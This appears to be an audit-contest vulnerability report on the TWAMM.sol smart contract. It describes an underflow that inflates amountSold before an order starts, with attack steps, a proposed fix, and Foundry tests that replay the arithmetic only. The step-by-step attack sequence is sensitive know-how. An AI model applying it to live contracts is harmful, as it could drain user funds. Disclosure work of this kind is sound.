  "body": "## Finding description and impact\n\nThe TWAMM.sol contract allows attackers to accumulate phantom `amountSold` values before an order's designated start time. This occurs due to an arithmetic underflow in an `unchecked` block, combined with a validation check that executes after state has already been corrupted. The vulnerability enables direct theft of user funds through over-refunds and can permanently freeze funds through accounting inconsistencies. The vulnerability exists in the `handleForwardData` function within the TWAMM contract. The entire function operates inside an `unchecked` block,\n```solidity\nfunction handleForwardData(Locker original, bytes memory data) internal override returns (bytes memory result) {\n        unchecked {\n            uint256 callType = abi.decode(data, (uint256));\n            address owner = original.addr();\n\n            if (callType == 0) {\n                (, bytes32 salt, OrderKey memory orderKey, int112 saleRateDelta) =\n                    abi.decode(data, (uint256, bytes32, OrderKey, int112));\n\n                (uint64 startTime, uint64 endTime) = (orderKey.config.startTime(), orderKey.config.endTime());\n\n                if (endTime <= block.timestamp) revert OrderAlreadyEnded();\n\n                if (\n                    !isTimeValid(block.timestamp, startTime) || !isTimeValid(block.timestamp, endTime)\n                        || startTime >= endTime\n                ) {\n                    revert InvalidTimestamps();\n``` \n\nwhich disables Solidity's automatic overflow/underflow protection.\n\n**Vulnerable Code Location**: `src/extensions/TWAMM.sol:248-271`\n\n```solidity\n190: function handleForwardData(Locker original, bytes memory data) internal override returns (bytes memory result) {\n191:     unchecked {  // ← ENTIRE FUNCTION IS UNCHECKED\n         // ... order processing logic ...\n\n248:     orderStateSlot.store(\n249:         OrderState.unwrap(\n250:             createOrderState({\n251:                 _lastUpdateTime: uint32(block.timestamp),\n252:                 _saleRate: uint112(saleRateNext),\n253:                 _amountSold: uint112(\n254:                     amountSold\n255:                         + computeAmountFromSaleRate({\n256:                             saleRate: saleRate,\n257:                             duration: FixedPointMathLib.min(\n258:                                 uint32(block.timestamp) - lastUpdateTime,\n259:                                 uint32(uint64(block.timestamp) - startTime)  // ← UNDERFLOWS HERE\n260:                             ),\n261:                             roundUp: false\n262:                         })\n263:                 )\n264:             })\n265:         )\n266:     );\n267:\n268:     // State is ALREADY STORED at this point\n269:\n270:     // This check comes TOO LATE - after state corruption\n271:     if (block.timestamp < startTime) {\n272:         _updateTime(poolId, startTime, saleRateDelta, isToken1, numOrdersChange);\n273:         _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);\n274:     }\n```\n\n### How the bug works\n\n**Step 1: Arithmetic Underflow**\nWhen `block.timestamp < startTime`, the expression on line 259 underflows:\n\n```solidity\nuint32(uint64(block.timestamp) - startTime)\n```\n\nExample with real values:\n- `block.timestamp = 1536`\n- `startTime = 2048`\n- `uint64(1536) - uint64(2048) = underflow`\n- Result: `18446744073709551104` (wrapped value)\n- `uint32(...)` truncates to: `4294966784` (still huge!)\n\n**Step 2: Incorrect Duration Selection**\nThe `min()` function then selects the smaller of two values:\n\n```solidity\nmin(\n    uint32(block.timestamp) - lastUpdateTime,  // = 512 (time since last update)\n    uint32(uint64(block.timestamp) - startTime) // = 4294966784 (underflow)\n)\n// Returns: 512\n```\n\n**Expected behavior**: Duration should be `0` since the order hasn't started\n**Actual behavior**: Duration is `512` (time elapsed since last update)\n\n**Step 3: Phantom AmountSold Accumulation**\nThe incorrect duration is used to calculate `amountSold`:\n\n```solidity\namountSold = amountSold + (saleRate × duration)\n           = 0 + (1e15 × 512)\n           = 512000000000000000000\n```\n\nThis phantom amount is stored to state (line 248-266) **before** the check on line 271 that determines if the order has started.\n\n**Step 4: Late Validation Check**\nBy the time the code reaches line 271:\n```solidity\nif (block.timestamp < startTime) {\n    // This branch handles pre-start orders\n    // But amountSold is ALREADY corrupted in storage!\n}\n```\n\nThe corrupted state has already been written, making this check ineffective.\n\n### impact\n\n- Direct Fund Theft as Inflated `amountSold` values lead to over-refunds, Attackers can claim tokens never actually sold, Losses scale with `saleRate` and time before start.\n- Permanent Fund Freezing - Inconsistent accounting state can cause update/settlement functions to revert, Orders may become \"bricked\" with funds locked\n- Accounting Corruption as amountSold` no longer reflects reality, Fee calculations become incorrect, Debt settlement logic produces wrong results, Systems relying on order state receive invalid data\n\n\n## Recommended mitigation steps\n\nMove the start time check BEFORE the duration calculation:\n\n```solidity\nfunction handleForwardData(Locker original, bytes memory data) internal override returns (bytes memory result) {\n    unchecked {\n        // ... existing validation code ...\n\n        // FIX: Calculate effective duration based on start time\n        uint256 effectiveDuration;\n\n        if (block.timestamp < startTime) {\n            // Order hasn't started yet - no duration should accrue\n            effectiveDuration = 0;\n        } else if (block.timestamp >= endTime) {\n            // Order has ended\n            effectiveDuration = FixedPointMathLib.min(\n                uint32(block.timestamp) - lastUpdateTime,\n                uint32(endTime - FixedPointMathLib.max(lastUpdateTime, startTime))\n            );\n        } else {\n            // Order is active\n            effectiveDuration = FixedPointMathLib.min(\n                uint32(block.timestamp) - lastUpdateTime,\n                uint32(block.timestamp - startTime)  // Now safe: block.timestamp >= startTime\n            );\n        }\n\n        // Now use effectiveDuration instead of the buggy calculation\n        orderStateSlot.store(\n            OrderState.unwrap(\n                createOrderState({\n                    _lastUpdateTime: uint32(block.timestamp),\n                    _saleRate: uint112(saleRateNext),\n                    _amountSold: uint112(\n                        amountSold + computeAmountFromSaleRate({\n                            saleRate: saleRate,\n                            duration: effectiveDuration,  // Safe value\n                            roundUp: false\n                        })\n                    )\n                })\n            )\n        );\n\n        // Continue with existing logic...\n    }\n}\n```",
  "proof_of_concept": "### Attack Steps\n\n**Step 1: Create Order with Future Start Time**\n```solidity\n// Current time: 1024\n// Start time: 2048 (1024 seconds in future)\n// End time: 3072\n\nOrderKey memory orderKey = OrderKey({\n    token0: tokenA,\n    token1: tokenB,\n    config: createOrderConfig({\n        startTime: 2048,\n        endTime: 3072,\n        ...\n    })\n});\n\n// Create order with sale rate of 1e15 tokens/second\norders.mintAndIncreaseSellAmount(orderKey, amount, maxRate);\n```\n**Result**: Order created, `amountSold = 0` ✓\n\n**Step 2: Wait (Still Before Start Time)**\n```solidity\n// Advance to t=1536 (512 seconds before start!)\nvm.warp(1536);\n```\n\n**Step 3: Trigger Vulnerable Code**\n```solidity\n// Call any function that updates the order\norders.decreaseSaleRate(orderId, orderKey, 0);\n// Even decreasing by 0 triggers the update!\n```\n\n**What Happens Internally**:\n1. `handleForwardData` is called\n2. Line 259: `uint32(uint64(1536) - 2048)` underflows\n3. Line 257-260: `min(512, 4294966784)` returns `512`\n4. Line 254-262: `amountSold += saleRate * 512`\n5. Line 248: Corrupted state written to storage\n6. Line 271: Check executes (too late!)\n\n**Result**: `amountSold = 512 * 1e15` ✗ (should be 0!)\n\n**Step 4: Repeat for Maximum Effect**\n```solidity\nvm.warp(1792);  // Still before start\norders.decreaseSaleRate(orderId, orderKey, 0);\n// amountSold += 256 * 1e15\n\nvm.warp(1920);  // Still before start\norders.decreaseSaleRate(orderId, orderKey, 0);\n// amountSold += 128 * 1e15\n\n// Total phantom accumulation: (512 + 256 + 128) * 1e15\n```\n\n**Step 5: Exploit Inflated AmountSold**\nThe inflated `amountSold` is used in refund calculations (lines 309-337):\n\n```solidity\n// Remaining amount calculation uses inflated amountSold\nuint256 remainingSellAmount = computeAmountFromSaleRate({\n    saleRate: saleRate,\n    duration: durationRemaining,\n    roundUp: true\n});\n\n// Delta is negative because amountSold is artificially high\nint256 amountDelta = int256(amountRequired) - int256(remainingSellAmount);\n\nif (amountDelta < 0) {\n    // Attacker receives refund for phantom \"sold\" tokens!\n    uint128 refund = uint128(uint256(-amountDelta));\n    // Direct theft of funds\n}\n```\n\n**Step 6: Profit**\nAttacker receives tokens that were never actually sold, directly stealing from the pool or other users.\n\n### PoC Breakdown\n\n**Test 1: `test_underflow_calculation()`**\nDemonstrates the exact arithmetic underflow:\n```solidity\nunchecked {\n    underflowResult = blockTimestamp - startTime;  // 1500 - 2000\n    // Result: 18446744073709551115 (huge wrapped value)\n\n    duration = min(500, uint32(underflowResult));\n    // Result: 500 (WRONG - should be 0!)\n}\n```\n\n**Test 2: `test_phantom_amountSold_calculation()`**\nShows phantom accumulation:\n```solidity\nuint112 saleRate = 1e15;\nuint32 phantomDuration = 500;\n\nphantomAmountSold = saleRate * phantomDuration;\n// = 500000000000000000000 tokens recorded as \"sold\"\n// But order hasn't even started!\n```\n\n**Test 3: `test_multiple_updates_compound()`**\nProves repeated exploitation:\n```solidity\n// Update 1 at t=1200: amountSold += 200 * saleRate\n// Update 2 at t=1500: amountSold += 300 * saleRate\n// Update 3 at t=1800: amountSold += 300 * saleRate\n// Total: 800 * saleRate phantom tokens!\n```\n\n**Test 4: `test_vulnerable_code_path()`**\nReplicates exact TWAMM code:\n```solidity\nunchecked {\n    duration = _min(\n        blockTimestamp - lastUpdateTime,           // 500\n        uint32(uint64(blockTimestamp) - startTime) // 4294966784\n    );\n}\n// Result: duration = 500 (should be 0)\n```\n\nhere is the poc \n```javascript\n// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../src/types/poolConfig.sol\";\nimport {TWAMM} from \"../src/extensions/TWAMM.sol\";\nimport {Core} from \"../src/Core.sol\";\nimport {OrderKey} from \"../src/types/orderKey.sol\";\nimport {createOrderConfig} from \"../src/types/orderConfig.sol\";\nimport {TWAMMStorageLayout} from \"../src/libraries/TWAMMStorageLayout.sol\";\nimport {OrderState} from \"../src/types/orderState.sol\";\nimport {OrderId} from \"../src/types/orderId.sol\";\nimport {StorageSlot} from \"../src/types/storageSlot.sol\";\nimport {PoolId} from \"../src/types/poolId.sol\";\n\n/// @title Minimal Pre-Start AmountSold Vulnerability PoC\n/// @notice Demonstrates that amountSold accrues before order start time\ncontract PreStartBugSimpleTest is Test {\n\n    function test_underflow_calculation() public pure {\n        // Demonstrate the underflow that happens in the vulnerable code\n\n        uint64 blockTimestamp = 1500;\n        uint64 startTime = 2000;\n\n        // KEY POINT: The vulnerable code uses an UNCHECKED block!\n        // This is what happens in the vulnerable code (line 259):\n        // uint32(uint64(block.timestamp) - startTime)\n\n        uint64 underflowResult;\n        uint32 truncatedResult;\n        uint32 duration;\n\n        unchecked {\n            // When block.timestamp < startTime, this underflows:\n            underflowResult = blockTimestamp - startTime;\n            // underflowResult is a huge number due to underflow\n\n            truncatedResult = uint32(underflowResult);\n\n            // The code then does min(timeElapsed, truncatedResult)\n            uint32 timeElapsed = 500;\n            duration = timeElapsed < truncatedResult ? timeElapsed : truncatedResult;\n        }\n\n        // Vulnerability proof:\n        assertEq(duration, 500, \"Duration should be 500 due to underflow bug\");\n\n        // But it SHOULD be 0 since the order hasn't started yet!\n        // The correct calculation would be:\n        uint32 correctDuration = blockTimestamp >= startTime\n            ? uint32(blockTimestamp - startTime)\n            : 0;\n        assertEq(correctDuration, 0, \"Correct duration should be 0\");\n    }\n\n    function test_phantom_amountSold_calculation() public pure {\n        // Demonstrate how phantom amountSold accumulates\n\n        uint112 saleRate = 1e15; // 1e15 tokens per second\n        uint32 phantomDuration = 500; // 500 seconds (from the underflow bug)\n\n        // The vulnerable code calculates:\n        uint256 phantomAmountSold = uint256(saleRate) * phantomDuration;\n\n        assertEq(phantomAmountSold, 500 * 1e15, \"Phantom amount sold accumulates incorrectly\");\n\n        // But the correct amountSold before start time should be:\n        uint256 correctAmountSold = 0;\n        assertEq(correctAmountSold, 0, \"Amount sold should be 0 before start\");\n    }\n\n    function test_multiple_updates_compound() public pure {\n        // Demonstrate how repeated updates before start time compound the bug\n\n        uint112 saleRate = 1e15;\n        uint112 amountSold = 0;\n\n        // First update at t=1200 (800s before start)\n        // Time elapsed since order creation = 200s\n        amountSold += uint112(uint256(saleRate) * 200);\n        assertEq(amountSold, 200 * 1e15);\n\n        // Second update at t=1500 (500s before start)\n        // Time elapsed since last update = 300s\n        amountSold += uint112(uint256(saleRate) * 300);\n        assertEq(amountSold, 500 * 1e15);\n\n        // Third update at t=1800 (200s before start)\n        // Time elapsed since last update = 300s\n        amountSold += uint112(uint256(saleRate) * 300);\n        assertEq(amountSold, 800 * 1e15);\n\n        // Total phantom accumulation: 800 * 1e15 tokens\n        // All accumulated BEFORE the order even started!\n        assertTrue(amountSold > 0, \"Phantom amountSold accumulated before start\");\n    }\n\n    function test_vulnerable_code_path() public pure {\n        // Show the exact vulnerable code path from TWAMM.sol:257-260\n\n        uint32 lastUpdateTime = 1000;\n        uint64 startTime = 2000;\n        uint32 blockTimestamp = 1500;\n\n        uint32 duration;\n\n        // The bug is that the entire function is in an unchecked block (line 191)\n        // so the underflow doesn't revert!\n        unchecked {\n            // This is the EXACT calculation from the vulnerable code:\n            duration = _min(\n                blockTimestamp - lastUpdateTime,          // = 500\n                uint32(uint64(blockTimestamp) - startTime) // = underflow → huge value\n            );\n        }\n\n        // Due to underflow, duration = 500 (should be 0!)\n        assertEq(duration, 500, \"Vulnerable duration calculation\");\n    }\n\n    function _min(uint32 a, uint32 b) private pure returns (uint32) {\n        return a < b ? a : b;\n    }\n}\n\n```\n\nsave the poc in the test folder as PreStartBugSimple.t.sol and run using ```FOUNDRY_PROFILE=ci forge test --match-contract PreStartBugSimpleTest -vv```",
